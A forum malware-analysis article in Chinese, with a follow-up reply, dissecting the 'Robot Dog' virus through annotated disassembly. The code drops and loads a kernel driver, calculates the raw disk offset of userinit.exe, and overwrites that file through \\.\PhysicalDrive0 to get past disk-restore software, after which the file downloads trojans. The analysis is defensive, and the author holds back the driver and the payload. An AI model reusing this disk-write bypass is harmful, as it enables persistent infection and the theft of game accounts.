
# 机器狗分析

> **原文**：[`www.pediy.com/kssd/pediy09/pediy09-272.htm`](https://www.pediy.com/kssd/pediy09/pediy09-272.htm)
>
> **【文章标题】**: 机器狗分析
>
> **【文章作者】: `hnhuqiong`
>
> **【作者邮箱】: `hnhuqiong@126.com`
>
> **【软件名称】: 机器狗（病毒）
>
> **【下载地址】: 自己搜索下载
>
> **【加壳方式】: 未知壳
>
> **【编写语言】: `MASM`
>
> **【使用工具】: `OD`
>
> **【操作平台】: `winxp SP2`
>
> **【软件介绍】: 穿透冰点型带驱动病毒
>
> **【作者声明】: 只是感兴趣，没有其他目的。失误之处敬请诸位大侠赐教!
>
> `--------------------------------------------------------------------------------------------`

### 【详细过程】

病毒程序加了壳，未知。很简单，`ESP` 定律直接就可以到 `OEP`，这节忽略带过。

病毒总结：

1. 首先从自身的资源区 `1001`（`3E9`）将埋藏的 `pcihdd.sys` 提取出来，写到 `system32` 的目录，然后预加载它。
2. 和 `pcihdd.sys` 通讯，将通过 `pcihdd.sys` 计算出被冰点隐藏的 `userinit.exe` 的绝对地址，然后将 `401000` 开始大小 `73e` 字节送 `pcihdd.sys` 校验串，驱动校验正确后，解码驱动自身资源（`1000/1000`)后回送程序，然后写向 `userinit.exe`。
3. `userinit.exe` 被修改，启动时候下载相应网页的木马并启动。
4. `pcihdd.sys` 有关键部位校验，并将校验值作为解码的判断条件，程序全程只能用硬件断点。
5. 第一次写病毒分析，`pcihdd.sys` 和 `userinit.exe`（修改的）不做文章提交，防止恶意复制。有兴趣的可以自己分析，都是明的，一分析就出来了。

#### （一）先整体看看这个病毒，解壳后程序很简洁。

```
004016ED d> 6A 00  push 0
004016EF   E8 80000000 call 00401774 ; <jmp.&kernel32.GetModuleHandleA>
004016F4   A3 F0304000 mov dword ptr ds:[4030F0],eax
004016F9   E8 CBF9FFFF call 004010C9 ; 这里负责释放 pcihdd.sys 然后加载它①
004016FE   68 00010000 push 100
00401703   68 F4304000 push 4030F4
00401708   68 2B134000 push 40132B ; ASCII "%SystemRoot%\System32\Userinit.exe"
0040170D   E8 50000000 call 00401762 ; <jmp.&kernel32.ExpandEnvironmentStringsA>
00401712   68 F4304000 push 4030F4
00401717   E8 32FCFFFF call 0040134E ; 这里是写磁盘，和 pcihdd.sys 通讯（重点）②
0040171C   0BC0 or eax,eax
0040171E   75 0C jnz short 0040172C ; dumped\_.0040172C
00401720   68 E7304000 push 4030E7
00401725   E8 68000000 call 00401792 ; <jmp.&kernel32.OutputDebugStringA>
0040172A   EB 06 jmp short 00401732 ; dumped\_.00401732
0040172C   50 push eax
0040172D   E8 60000000 call 00401792 ; <jmp.&kernel32.OutputDebugStringA>
00401732   E8 F9F8FFFF call 00401030 ; 这里卸载 pcihdd.sys，然后删除
00401737   6A 00 push 0
00401739   E8 1E000000 call 0040175C ; <jmp.&kernel32.ExitProcess>
```

#### ①从自身的资源区 `1001`（`3E9`）释放并加载 `PCIHDD.sys`

```
004010C9 55 push ebp
004010CA 8BEC mov ebp,esp
004010CC 81C4 C8FEFFFF add esp,-138
004010D2 68 E9030000 push 3E9
004010D7 68 E9030000 push 3E9 ; 1001 资源项
004010DC FF35 F0304000 push dword ptr ds:[4030F0] ; 查找自身资源里的 pcihdd.sys
004010E2 E8 81060000 call 00401768 ; <jmp.&kernel32.FindResourceA>
004010E7 0BC0 or eax,eax ; 得出资源的指针
004010E9 74 3D je short 00401128 ; 没有找到，gameover

004010EB 8985 F4FEFFFF mov dword ptr ss:[ebp-10C],eax ; 保存资源指针
004010F1 50 push eax
004010F2 FF35 F0304000 push dword ptr ds:[4030F0] ; dumped\_.00400000
004010F8 E8 B3060000 call 004017B0 ; <jmp.&kernel32.SizeofResource>
004010FD 8985 ECFEFFFF mov dword ptr ss:[ebp-114],eax ; 保存 pcihdd.sys 长度
00401103 FFB5 F4FEFFFF push dword ptr ss:[ebp-10C]
00401109 FF35 F0304000 push dword ptr ds:[4030F0] ; dumped\_.00400000
0040110F E8 72060000 call 00401786 ; <jmp.&kernel32.LoadResource>
00401114 0BC0 or eax,eax ; eax 是求出 pcihdd.sys 的地址
00401116 74 10 je short 00401128 ; 00401128
00401118 50 push eax
00401119 E8 6E060000 call 0040178C ; <jmp.&kernel32.LockResource>
0040111E 0BC0 or eax,eax
00401120 74 06 je short 00401128 ; 00401128
00401122 8985 F0FEFFFF mov dword ptr ss:[ebp-110],eax ; 保存 pcihdd.sys 的地址
00401128 0BC0 or eax,eax

00401131 68 00010000 push 100
00401136 8D85 F8FEFFFF lea eax,dword ptr ss:[ebp-108] ; 放字符串缓冲区地址
0040113C 50 push eax
0040113D 68 00104000 push 401000 ; ASCII "%SystemRoot%\system32\drivers\pcihdd.sys"
00401142 E8 1B060000 call 00401762 ; <jmp.&kernel32.ExpandEnvironmentStringsA>
00401147 6A 00 push 0
00401149 68 80000000 push 80
0040114E 6A 04 push 4 ; open_always
00401150 6A 00 push 0
00401152 6A 00 push 0
00401154 68 00000040 push 40000000 ; Generic_Write
00401159 8D85 F8FEFFFF lea eax,dword ptr ss:[ebp-108]
0040115F 50 push eax ; 创建 pcihdd.sys
00401160 E8 E5050000 call 0040174A ; <jmp.&kernel32.CreateFileA>
00401165 83F8 FF cmp eax,-1
00401168 75 07 jnz short 00401171 ; 00401171
0040116A E9 A5010000 jmp 00401314 ; 00401314
0040116F EB 35 jmp short 004011A6 ; 004011A6
00401171 8945 F8 mov dword ptr ss:[ebp-8],eax ; 保存 pcihdd.sys 的句柄

00401174 6A 00 push 0
00401176 8D45 FC lea eax,dword ptr ss:[ebp-4]
00401179 50 push eax ; 实际所写长度
0040117A FFB5 ECFEFFFF push dword ptr ss:[ebp-114] ; 文件长度
00401180 FFB5 F0FEFFFF push dword ptr ss:[ebp-110] ; 缓冲区地址=pcihdd.sys 地址
00401186 FF75 F8 push dword ptr ss:[ebp-8] ; pcihdd.sys 句柄
00401189 E8 28060000 call 004017B6 ; <jmp.&kernel32.WriteFile>
0040118E FF75 F8 push dword ptr ss:[ebp-8]
00401191 E8 0E060000 call 004017A4 ; <jmp.&kernel32.SetEndOfFile>
00401196 FF75 F8 push dword ptr ss:[ebp-8]
00401199 E8 D0050000 call 0040176E ; <jmp.&kernel32.FlushFileBuffers>
0040119E FF75 F8 push dword ptr ss:[ebp-8]
```



```
004011A1 E8 9E050000 call 00401744 ; <jmp.&kernel32.CloseHandle>

004011A6 68 3F000F00 push 0F003F
004011AB 6A 00 push 0
004011AD 6A 00 push 0 ; 打开 SCM
004011AF E8 20060000 call 004017D4 ; <jmp.&advapi32.OpenSCManagerA>
004011B4 0BC0 or eax,eax
004011B6 0F84 34010000 je 004012F0 ; 004012F0
004011BC 8985 E8FEFFFF mov dword ptr ss:[ebp-118],eax
004011C2 6A 00 push 0
004011C4 6A 00 push 0
004011C6 6A 00 push 0
004011C8 6A 00 push 0
004011CA 6A 00 push 0
004011CC 8D85 F8FEFFFF lea eax,dword ptr ss:[ebp-108]
004011D2 50 push eax
004011D3 6A 00 push 0
004011D5 6A 03 push 3 ; SERVICE_DEMAND_START
004011D7 6A 01 push 1 ; SERVICE_KERNEL_DRIVER
004011D9 6A 00 push 0
004011DB 68 29104000 push 401029 ; DisplayName = "PciHdd"
004011E0 68 29104000 push 401029 ; ServiceName = "PciHdd"
004011E5 FFB5 E8FEFFFF push dword ptr ss:[ebp-118] ; 创建 PciHdd 服务
004011EB E8 D8050000 call 004017C8 ; <jmp.&advapi32.CreateServiceA>
004011F0 0BC0 or eax,eax
004011F2 74 16 je short 0040120A ; 如果创建失败，跳 0040120A

004011F4 8985 E4FEFFFF mov dword ptr ss:[ebp-11C],eax ; service 句柄
004011FA FFB5 E4FEFFFF push dword ptr ss:[ebp-11C]
00401200 E8 B7050000 call 004017BC ; <jmp.&advapi32.CloseServiceHandle>
00401205 E9 90000000 jmp 0040129A ; 0040129A
0040120A 68 FF010F00 push 0F01FF ; 这里创建失败则先停止原来的 PciHdd 服务然后删除再重新创建
0040120F 68 29104000 push 401029 ; ASCII "PciHdd"
00401214 FFB5 E8FEFFFF push dword ptr ss:[ebp-118]
0040121A E8 BB050000 call 004017DA ; <jmp.&advapi32.OpenServiceA>
0040121F 0BC0 or eax,eax
00401221 74 30 je short 00401253 ; 00401253
00401223 8985 E4FEFFFF mov dword ptr ss:[ebp-11C],eax
00401229 8D85 C8FEFFFF lea eax,dword ptr ss:[ebp-138]
0040122F 50 push eax
00401230 6A 01 push 1
00401232 FFB5 E4FEFFFF push dword ptr ss:[ebp-11C] ; 停止原来的 PciHdd 服务
00401238 E8 85050000 call 004017C2 ; <jmp.&advapi32.ControlService>
0040123D FFB5 E4FEFFFF push dword ptr ss:[ebp-11C] ; 删除服务
00401243 E8 86050000 call 004017CE ; <jmp.&advapi32.DeleteService>
00401248 FFB5 E4FEFFFF push dword ptr ss:[ebp-11C]
0040124E E8 69050000 call 004017BC ; <jmp.&advapi32.CloseServiceHandle>
00401253 6A 00 push 0
00401255 6A 00 push 0
00401257 6A 00 push 0
00401259 6A 00 push 0
0040125B 6A 00 push 0
0040125D 8D85 F8FEFFFF lea eax,dword ptr ss:[ebp-108]
00401263 50 push eax
00401264 6A 00 push 0
00401266 6A 03 push 3
00401268 6A 01 push 1
0040126A 6A 00 push 0
0040126C 68 29104000 push 401029 ; ASCII "PciHdd"
00401271 68 29104000 push 401029 ; ASCII "PciHdd"
00401276 FFB5 E8FEFFFF push dword ptr ss:[ebp-118] ; 重新创建
0040127C E8 47050000 call 004017C8 ; <jmp.&advapi32.CreateServiceA>
00401281 0BC0 or eax,eax
00401283 74 13 je short 00401298 ; 00401298
00401285 8985 E4FEFFFF mov dword ptr ss:[ebp-11C],eax
0040128B FFB5 E4FEFFFF push dword ptr ss:[ebp-11C]
00401291 E8 26050000 call 004017BC ; <jmp.&advapi32.CloseServiceHandle>
00401296 EB 02 jmp short 0040129A ; 0040129A
00401298 EB 7A jmp short 00401314 ; 00401314

0040129A 6A 10 push 10
0040129C 68 29104000 push 401029 ; ASCII "PciHdd"
004012A1 FFB5 E8FEFFFF push dword ptr ss:[ebp-118]
004012A7 E8 2E050000 call 004017DA ; <jmp.&advapi32.OpenServiceA>
004012AC 0BC0 or eax,eax
004012AE 74 33 je short 004012E3 ; 004012E3
004012B0 8985 E4FEFFFF mov dword ptr ss:[ebp-11C],eax
004012B6 6A 00 push 0
004012B8 6A 00 push 0
004012BA FFB5 E4FEFFFF push dword ptr ss:[ebp-11C] ; 启动服务
004012C0 E8 1B050000 call 004017E0 ; <jmp.&advapi32.StartServiceA>
004012C5 0BC0 or eax,eax
004012C7 75 02 jnz short 004012CB ; 004012CB
004012C9 EB 49 jmp short 00401314 ; 00401314
004012CB FFB5 E4FEFFFF push dword ptr ss:[ebp-11C]
004012D1 E8 E6040000 call 004017BC ; <jmp.&advapi32.CloseServiceHandle>
004012D6 FFB5 E8FEFFFF push dword ptr ss:[ebp-118]
004012DC E8 DB040000 call 004017BC ; <jmp.&advapi32.CloseServiceHandle>
004012E1 EB 0D jmp short 004012F0 ; 004012F0
004012E3 FFB5 E8FEFFFF push dword ptr ss:[ebp-118]
004012E9 E8 CE040000 call 004017BC ; <jmp.&advapi32.CloseServiceHandle>
004012EE EB 24 jmp short 00401314 ; 00401314
004012F0 68 00010000 push 100
004012F5 8D85 F8FEFFFF lea eax,dword ptr ss:[ebp-108]
004012FB 50 push eax
004012FC 68 00104000 push 401000 ; ASCII "%SystemRoot%\system32\drivers\pcihdd.sys"
00401301 E8 5C040000 call 00401762 ; <jmp.&kernel32.ExpandEnvironmentStringsA>
```



```asm
00401306     8D85 F8FEFFFF           lea eax,dword ptr ss:[ebp-108]  
0040130C     50                     push eax                     ; 删除 pcihdd.sys 文件  
0040130D     E8 3E040000           call 00401750                ; <jmp.&kernel32.DeleteFileA>  
00401312     C9                     leave  
00401313     C3                     retn  
0040134E     55                     push ebp  
0040134F     8BEC                   mov ebp,esp  
00401351     81C4 ACFAFFFF          add esp,-554  
00401357     60                     pushad  
00401358     6A 00                  push 0  
0040135A     6A 00                  push 0  
0040135C     6A 03                  push 3  
0040135E     6A 00                  push 0  
00401360     6A 00                  push 0  
00401362     68 00000080           push 80000000                ; \_READ  
00401367     68 2E304000           push 40302E                  ; ASCII "\\\\.\PhysicalHardDisk0"  
0040136C     E8 D9030000           call 0040174A                ; <jmp.&kernel32.CreateFileA>  
00401371     83F8 FF              cmp eax,-1                   ; eax=PhysicalHardDisk0 句柄  
00401374     0F84 64030000         je 004016DE                  ; 打不开则重新回去  
0040137A     8985 B8FAFFFF         mov dword ptr ss:[ebp-548],eax  
00401380     6A 00                  push 0  
00401382     68 00000020           push 20000000                ; 无缓冲  
00401387     6A 03                  push 3                       ; 文件必须已经存在。由设备提出要求  
00401389     6A 00                  push 0  
0040138B     6A 03                  push 3                       ; 共享类型=R|W  
0040138D     68 00000080           push 80000000                ; GENERIC\_READ  
00401392     FF75 08               push dword ptr ss:[ebp+8]    ; filename=userinit.exe  
00401395     E8 B0030000           call 0040174A                ; <jmp.&kernel32.CreateFileA>  
0040139A     83F8 FF              cmp eax,-1  
0040139D     0F84 27030000         je 004016CA                  ; 004016CA  
004013A3     8945 F4               mov dword ptr ss:[ebp-C],eax ; userinit.exe 文件句柄  
004013A6     33C0                  xor eax,eax  
004013A8     8945 EC               mov dword ptr ss:[ebp-14],eax  
004013AB     8945 F0               mov dword ptr ss:[ebp-10],eax  
004013AE     68 10010000           push 110                     ; 缓冲区清零长度  
004013B3     8D85 D4FEFFFF         lea eax,dword ptr ss:[ebp-12C] ; 缓冲区指针  
004013B9     50                     push eax  
004013BA     E8 DF030000           call 0040179E                ; <jmp.&kernel32.RtlZeroMemory>  
004013BF     6A 00                  push 0  
004013C1     8D45 E8               lea eax,dword ptr ss:[ebp-18]  
004013C4     50                     push eax  
004013C5     68 10010000           push 110                     ; 输出缓冲区长度  
004013CA     8D85 D4FEFFFF         lea eax,dword ptr ss:[ebp-12C] ; 输出缓冲区  
004013D0     50                     push eax  
004013D1     6A 08                  push 8                       ; 输入缓冲区长度  
004013D3     8D45 EC               lea eax,dword ptr ss:[ebp-14] ; 输入缓冲区  
004013D6     50                     push eax  
004013D7     68 73000900           push 90073                   ; 发送 FSCTL\_GET\_RETRIEVAL\_POINTERS 获取 userinit.exe 的文件分配图  
004013DC     FF75 F4               push dword ptr ss:[ebp-C]  
004013DF     E8 72030000           call 00401756                ; <jmp.&kernel32.DeviceIoControl>  
004013E4     0BC0                  or eax,eax  
004013E6     0F84 C7020000         je 004016B3                  ; 004016B3  
004013EC     8DBD D4FEFFFF         lea edi,dword ptr ss:[ebp-12C]  
004013F2     8B1F                  mov ebx,dword ptr ds:[edi]  
004013F4     8D7F 10               lea edi,dword ptr ds:[edi+10]  
004013F7     8B45 E8               mov eax,dword ptr ss:[ebp-18]  
004013FA     0BDB                  or ebx,ebx  
004013FC     0F84 B8020000         je 004016BA                  ; 004016BA  
00401402     8B47 08               mov eax,dword ptr ds:[edi+8]  
00401405     8B57 0C               mov edx,dword ptr ds:[edi+C]  
00401408     83F8 FF              cmp eax,-1  
0040140B     0F84 99020000         je 004016AA                  ; 004016AA  
00401411     83FA FF              cmp edx,-1  
00401414     0F84 90020000         je 004016AA                  ; 004016AA  
0040141A     8985 C4FAFFFF         mov dword ptr ss:[ebp-53C],eax  
00401420     8995 C8FAFFFF         mov dword ptr ss:[ebp-538],edx  
00401426     6A 00                  push 0  
00401428     8D45 E8               lea eax,dword ptr ss:[ebp-18]  
0040142B     50                     push eax  
0040142C     68 00020000           push 200                     ; 从 userinit.exe 文件头开始读 200（512）字节  
00401431     8D85 D4FCFFFF         lea eax,dword ptr ss:[ebp-32C] ; 缓冲区地址  
00401437     50                     push eax  
00401438     FF75 F4               push dword ptr ss:[ebp-C]  
0040143B     E8 58030000           call 00401798                ; <jmp.&kernel32.ReadFile>  
00401440     FF75 F4               push dword ptr ss:[ebp-C]  
00401443     E8 FC020000           call 00401744                ; <jmp.&kernel32.CloseHandle>  
00401448     C745 F4 00000000      mov dword ptr ss:[ebp-C],0  
0040144F     6A 00                  push 0  
00401451     6A 00                  push 0  
00401453     6A 03                  push 3  
00401455     6A 00                  push 0  
00401457     6A 03                  push 3  
00401459     68 000000C0           push C0000000                ; 打开物理硬盘读写  
0040145E     68 44304000           push 403044                  ; ASCII "\\\\.\PhysicalDrive0"  
00401463     E8 E2020000           call 0040174A                ; <jmp.&kernel32.CreateFileA>  
00401468     83F8 FF              cmp eax,-1  
0040146B     0F84 40020000         je 004016B1                  ; 004016B1  
00401471     8985 D0FAFFFF         mov dword ptr ss:[ebp-530],eax ; \\.\PhysicalDrive0 文件句柄  
00401477     6A 00                  push 0  
00401479     6A 00                  push 0  
0040147B     6A 00                  push 0  
0040147D     FFB5 D0FAFFFF         push dword ptr ss:[ebp-530]  
00401483     E8 22030000           call 004017AA                ; <jmp.&kernel32.SetFilePointer>  
00401488     6A 00                  push 0  
0040148A     8D45 E8               lea eax,dword ptr ss:[ebp-18] ; 读入的实际长度  
0040148D     50                     push eax
```



```
0040148E     68 00020000              push 200                                  ; 缓冲区长度
00401493     8D85 D4FAFFFF          lea eax,dword ptr ss:[ebp-52C]            ; 读入\\.\PhysicalDrive0 的缓冲区地址
00401499     50                     push eax
0040149A     FFB5 D0FAFFFF          push dword ptr ss:[ebp-530]               ; \\.\PhysicalDrive0 句柄，读取 1 扇区
004014A0     E8 F3020000           call 00401798                              ; <jmp.&kernel32.ReadFile>
004014A5     8DBD D4FAFFFF          lea edi,dword ptr ss:[ebp-52C]
004014AB     80BF BE010000 80      cmp byte ptr ds:[edi+1BE],80              ; 分区是否为可引导分区（也就是常规的分区是否激活概念）
004014B2     0F85 DE010000         jnz 00401696                               ; 00401696
004014B8     0FB69F C2010000      movzx ebx,byte ptr ds:[edi+1C2]           ; 取分区系统类型
004014BF     83FB 0B              cmp ebx,0B                                 ; 文件系统是否为 FAT32
004014C2     74 0E               je short 004014D2                          ; 004014D2
004014C4     83FB 0C              cmp ebx,0C                                 ; 文件系统是否为 FAT32
004014C7     74 09               je short 004014D2                          ; 004014D2
004014C9     83FB 07              cmp ebx,7                                  ; 文件系统是否为 NTFS
004014CC     0F85 BB010000        jnz 0040168D                               ; 0040168D
004014D2     8B87 C6010000        mov eax,dword ptr ds:[edi+1C6]             ; C 盘起始扇区（首扇区的相对扇区号）
004014D8     8985 CCFAFFFF        mov dword ptr ss:[ebp-534],eax
004014DE     33D2                 xor edx,edx
004014E0     69C0 00020000        imul eax,eax,200                           ; 3f*200
004014E6     8955 E8              mov dword ptr ss:[ebp-18],edx
004014E9     8BC8                 mov ecx,eax
004014EB     6A 00                push 0
004014ED     8D45 E8              lea eax,dword ptr ss:[ebp-18]
004014F0     50                   push eax
004014F1     51                   push ecx                                     ; 转移定位到 7e00
004014F2     FFB5 D0FAFFFF        push dword ptr ss:[ebp-530]                ; \\.\PhysicalDrive0 句柄
004014F8     E8 AD020000         call 004017AA                              ; <jmp.&kernel32.SetFilePointer>
004014FD     6A 00                push 0
004014FF     8D45 E8              lea eax,dword ptr ss:[ebp-18]
00401502     50                   push eax
00401503     68 00020000          push 200
00401508     8D85 D4FAFFFF        lea eax,dword ptr ss:[ebp-52C]
0040150E     50                   push eax
0040150F     FFB5 D0FAFFFF        push dword ptr ss:[ebp-530]                ; 读取 C 盘的 1 扇区
00401515     E8 7E020000         call 00401798                              ; <jmp.&kernel32.ReadFile>
0040151A     8DBD D4FAFFFF        lea edi,dword ptr ss:[ebp-52C]
00401520     0FB747 0E            movzx eax,word ptr ds:[edi+E]
00401524     0185 CCFAFFFF        add dword ptr ss:[ebp-534],eax             ; 3f+24=63
0040152A     83FB 0B              cmp ebx,0B
0040152D     74 05               je short 00401534                          ; 00401534
0040152F     83FB 0C              cmp ebx,0C
00401532     75 12               jnz short 00401546                         ; 00401546
00401534     0FB64F 10            movzx ecx,byte ptr ds:[edi+10]
00401538     8B47 24              mov eax,dword ptr ds:[edi+24]
0040153B     33D2                 xor edx,edx
0040153D     0FAFC1               imul eax,ecx
00401540     0185 CCFAFFFF        add dword ptr ss:[ebp-534],eax             ; 63+48bc=491f
00401546     8B85 C4FAFFFF        mov eax,dword ptr ss:[ebp-53C]             ; 解码数 b6204
0040154C     8B95 C8FAFFFF        mov edx,dword ptr ss:[ebp-538]
00401552     0FB64F 0D            movzx ecx,byte ptr ds:[edi+D]
00401556     898D B4FAFFFF        mov dword ptr ss:[ebp-54C],ecx
0040155C     0FAFC1               imul eax,ecx                               ; b6204*10=b62040
0040155F     0385 CCFAFFFF        add eax,dword ptr ss:[ebp-534]
00401565     83D2 00              adc edx,0
00401568     69C0 00020000        imul eax,eax,200                           ; *200=6cd2be00
0040156E     8995 C0FAFFFF        mov dword ptr ss:[ebp-540],edx
00401574     8985 BCFAFFFF        mov dword ptr ss:[ebp-544],eax
0040157A     6A 00                push 0
0040157C     8D85 C0FAFFFF        lea eax,dword ptr ss:[ebp-540]
00401582     50                   push eax
00401583     FFB5 BCFAFFFF        push dword ptr ss:[ebp-544]
00401589     FFB5 D0FAFFFF        push dword ptr ss:[ebp-530]                ; userinit.exe 在盘的绝对偏移地址,也就是驱动先找到它的绝对地址，然后加密后报告给病毒
0040158F     E8 16020000         call 004017AA                              ; <jmp.&kernel32.SetFilePointer>
00401594     6A 00                push 0
00401596     8D45 E8              lea eax,dword ptr ss:[ebp-18]
00401599     50                   push eax
0040159A     68 00020000          push 200
0040159F     8D85 D4FAFFFF        lea eax,dword ptr ss:[ebp-52C]             ; 读 userinit.exe 的缓冲区
004015A5     50                   push eax
004015A6     FFB5 D0FAFFFF        push dword ptr ss:[ebp-530]
004015AC     E8 E7010000         call 00401798                              ; <jmp.&kernel32.ReadFile>

004015B1     8DBD D4FAFFFF        lea edi,dword ptr ss:[ebp-52C]
004015B7     8DB5 D4FCFFFF        lea esi,dword ptr ss:[ebp-32C]
004015BD     B9 00020000          mov ecx,200
004015C2     F3:A6              repe cmps byte ptr es:[edi],byte ptr ds:
004015C4     0BC9                 or ecx,ecx
004015C6     0F85 B8000000       jnz 00401684                                 ; dumped_.00401684
004015CC     6A 00                push 0
004015CE     8D85 C0FAFFFF        lea eax,dword ptr ss:[ebp-540]
004015D4     50                   push eax
004015D5     FFB5 BCFAFFFF        push dword ptr ss:[ebp-544]
004015DB     FFB5 D0FAFFFF        push dword ptr ss:[ebp-530]
004015E1     E8 C4010000         call 004017AA                              ; <jmp.&kernel32.SetFilePointer>
004015E6     8B85 B4FAFFFF        mov eax,dword ptr ss:[ebp-54C]
004015EC     C1E0 09              shl eax,9
004015EF     8985 B4FAFFFF        mov dword ptr ss:[ebp-54C],eax
004015F5     FFB5 B4FAFFFF        push dword ptr ss:[ebp-54C]
004015FB     6A 40                push 40
004015FD     E8 78010000         call 0040177A                              ; <jmp.&kernel32.GlobalAlloc>
00401602     0BC0                 or eax,eax
00401604     74 6A                je short 00401670                          ; dumped_.00401670
00401606     8985 B0FAFFFF        mov dword ptr ss:[ebp-550],eax
0040160C     B9 3E174000          mov ecx,40173E
00401611     81E9 00104000        sub ecx,401000                             ; ASCII "%SystemRoot%\system32\drivers\pcihdd.sys"
```



# 00401617 - 004016EA 汇编代码段

```asm
00401617     6A 00                          push 0  
00401619     8D45 E8                       lea eax,dword ptr ss:[ebp-18]  
0040161C     50                            push eax  
0040161D     FFB5 B4FAFFFF                 push dword ptr ss:[ebp-54C]  
00401623     FFB5 B0FAFFFF                 push dword ptr ss:[ebp-550]                  ; 解码后的缓冲区  
00401629     51                            push ecx  
0040162A     68 00104000                   push 401000                                ; ASCII "%SystemRoot%\system32\drivers\pcihdd.sys"  
0040162F     68 043C00F0                   push F0003C04  
00401634     FFB5 B8FAFFFF                 push dword ptr ss:[ebp-548]  
0040163A     E8 17010000                   call 00401756                              ; <jmp.&kernel32.DeviceIoControl>  
0040163F     6A 00                         push 0  
00401641     8D45 E8                       lea eax,dword ptr ss:[ebp-18]  
00401644     50                            push eax  
00401645     FFB5 B4FAFFFF                 push dword ptr ss:[ebp-54C]  
0040164B     FFB5 B0FAFFFF                 push dword ptr ss:[ebp-550]  
00401651     FFB5 D0FAFFFF                 push dword ptr ss:[ebp-530]                ; 写入 userinit.exe，成功穿透  
00401657     E8 5A010000                   call 004017B6                              ; <jmp.&kernel32.WriteFile>  
0040165C     FFB5 D0FAFFFF                 push dword ptr ss:[ebp-530]  
00401662     E8 07010000                   call 0040176E                              ; <jmp.&kernel32.FlushFileBuffers>  
00401667     C745 E4 00000000              mov dword ptr ss:[ebp-1C],0  
0040166E     EB 07                         jmp short 00401677                         ; dumped_.00401677  
00401670     C745 E4 57304000              mov dword ptr ss:[ebp-1C],403057  
00401677     FFB5 B0FAFFFF                 push dword ptr ss:[ebp-550]  
0040167D     E8 FE000000                   call 00401780                              ; <jmp.&kernel32.GlobalFree>  
00401682     EB 19                         jmp short 0040169D                         ; dumped_.0040169D  
00401684     C745 E4 66304000              mov dword ptr ss:[ebp-1C],403066  
0040168B     EB 10                         jmp short 0040169D                         ; dumped_.0040169D  
0040168D     C745 E4 75304000              mov dword ptr ss:[ebp-1C],403075  
00401694     EB 07                         jmp short 0040169D                         ; dumped_.0040169D  
00401696     C745 E4 86304000              mov dword ptr ss:[ebp-1C],403086  
0040169D     FFB5 D0FAFFFF                 push dword ptr ss:[ebp-530]  
004016A3     E8 9C000000                   call 00401744                              ; <jmp.&kernel32.CloseHandle>  
004016A8     EB 07                         jmp short 004016B1                         ; dumped_.004016B1  
004016AA     C745 E4 9D304000              mov dword ptr ss:[ebp-1C],40309D  
004016B1     EB 07                         jmp short 004016BA                         ; dumped_.004016BA  
004016B3     C745 E4 B8304000              mov dword ptr ss:[ebp-1C],4030B8  
004016BA     837D F4 00                    cmp dword ptr ss:[ebp-C],0  
004016BE     74 11                         je short 004016D1                          ; dumped_.004016D1  
004016C0     FF75 F4                       push dword ptr ss:[ebp-C]  
004016C3     E8 7C000000                   call 00401744                              ; <jmp.&kernel32.CloseHandle>  
004016C8     EB 07                         jmp short 004016D1                         ; dumped_.004016D1  
004016CA     C745 E4 CD304000              mov dword ptr ss:[ebp-1C],4030CD  
004016D1     FFB5 B8FAFFFF                 push dword ptr ss:[ebp-548]  
004016D7     E8 68000000                   call 00401744                              ; <jmp.&kernel32.CloseHandle>  
004016DC     EB 07                         jmp short 004016E5                         ; dumped_.004016E5  
004016DE     C745 E4 DA304000              mov dword ptr ss:[ebp-1C],4030DA  
004016E5     61                            popad  
004016E6     8B45 E4                       mov eax,dword ptr ss:[ebp-1C]  
004016E9     C9                            leave  
004016EA     C2 0400                       retn 4  
```

> BTW:CUG 还要提交文章，这篇看样子也就当分析的来玩了。
>
> ---
> 【版权声明】: 本文原创于看雪技术论坛, 转载请注明作者并保持文章的完整, 谢谢!
>
> 2007 年 09 月 10 日 18:17:26

# 00401546 - 00401568 汇编代码段

```asm
00401546     8B85 C4FAFFFF                 mov eax,dword ptr ss:[ebp-53C]             ; 解码数 b6204  
0040154C     8B95 C8FAFFFF                 mov edx,dword ptr ss:[ebp-538]  
00401552     0FB64F 0D                     movzx ecx,byte ptr ds:[edi+D]  
00401556     898D B4FAFFFF                 mov dword ptr ss:[ebp-54C],ecx  
0040155C     0FAFC1                        imul eax,ecx                                 ; b6204*10=b62040  
0040155F     0385 CCFAFFFF                 add eax,dword ptr ss:[ebp-534]  
00401565     83D2 00                       adc edx,0  
00401568     69C0 00020000                 imul eax,eax,200                             ; *200=6cd2be00  
```

你的分析中，漏掉了这一节，`B6204` 是 `pcihdd.sys` 计算后产生的。

# 004013D7 - 0040141A 汇编代码段

```asm
004013D7     68 73000900                   push 90073                                   ; 发送 FSCTL_GET_RETRIEVAL_POINTERS 获取 userinit.exe 的文件分配图  
004013DC     FF75 F4                       push dword ptr ss:[ebp-C]  
004013DF     E8 72030000                   call 00401756                                ; <jmp.&kernel32.DeviceIoControl>  
004013E4     0BC0                          or eax,eax  
004013E6     0F84 C7020000                 je 004016B3                                  ; 004016B3  
004013EC     8DBD D4FEFFFF                 lea edi,dword ptr ss:[ebp-12C]  
004013F2     8B1F                          mov ebx,dword ptr ds:[edi]  
004013F4     8D7F 10                       lea edi,dword ptr ds:[edi+10]  
004013F7     8B45 E8                       mov eax,dword ptr ss:[ebp-18]  
004013FA     0BDB                          or ebx,ebx  
004013FC     0F84 B8020000                 je 004016BA                                  ; 004016BA  
00401402     8B47 08                       mov eax,dword ptr ds:[edi+8]  
00401405     8B57 0C                       mov edx,dword ptr ds:[edi+C]  
00401408     83F8 FF                       cmp eax,-1  
0040140B     0F84 99020000                 je 004016AA                                  ; 004016AA  
00401411     83FA FF                       cmp edx,-1  
00401414     0F84 90020000                 je 004016AA                                  ; 004016AA  
0040141A     8985 C4FAFFFF                 mov dword ptr ss:[ebp-53C],eax  
```

## 算法说明

算法为:

- `3f` (第一扇区) + `24` = `63`
- `63` + `48bc` = `491f`
- (`b6204` * 10 + `491f`) * 200 = `6cd2be00`

定位数据

文中写的很清楚，谢谢！

这里通过运算，得出的 `6cd2be00`

本不想写的这样明，这样冰点影子系统的定位就全出来了。

## 补充分析

而你的说法中

1. 通过直接访问硬盘(`\\\\.\\PhysicalHardDisk0`)的的 MDR 和
2. 第一个分区的引导扇区得到分区参数来定位文件。

那么你漏掉了 `b6204` 这个算子。

分析这个且叫病毒的东西，是受人之托，网吧最近这个东西极为泛滥。游戏盗号等极为猖狂，而大量网吧深受其害。

文章其实没有什么技术含量的东西，见谅。

`4dd466d0e1e0cc123afbe504da2462ca`
